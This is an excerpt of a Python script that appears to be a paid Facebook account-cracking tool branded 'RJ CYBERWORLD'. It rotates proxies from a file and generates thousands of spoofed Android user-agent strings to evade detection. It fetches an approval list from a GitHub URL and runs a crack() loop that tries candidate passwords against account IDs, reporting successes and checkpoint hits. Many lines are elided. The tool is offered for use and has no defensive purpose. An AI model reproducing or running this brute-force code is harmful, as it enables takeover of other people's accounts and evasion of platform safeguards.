...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mRJ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/ '
	...
	aa='Mozilla/5.0 (Linux; Android 13; 23021RAA2Y Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko'
	...
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv)'
	...
	i='; AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177'
...
try:
    url_proxy = random.choice([
              "https://github.com/hridoyshanto/XZ/blob/main/Approval.txt",
])
except:pass
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/hridoyshanto/XZ/blob/main/Approval.txt').text
		ua=open('.Aprl.txt','w')
...
\033[38;5;46m WELCOME : RJ CYBERWORLD 
\033[38;5;46m TOOL OWNER : RJ
\033[38;5;46m VERSION :  0.2
\033[38;5;46m STATUS :  PAID 

\033[38;5;206mCREATE  BY RJ SRI LANKA ðŸ’™â¤ï¸ðŸ’—ðŸ’—ðŸŒ¹
\033[38;5;206mENJOY 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [RJ] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} {'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m [RJ-CP] {idf}  {pw} {N}')     
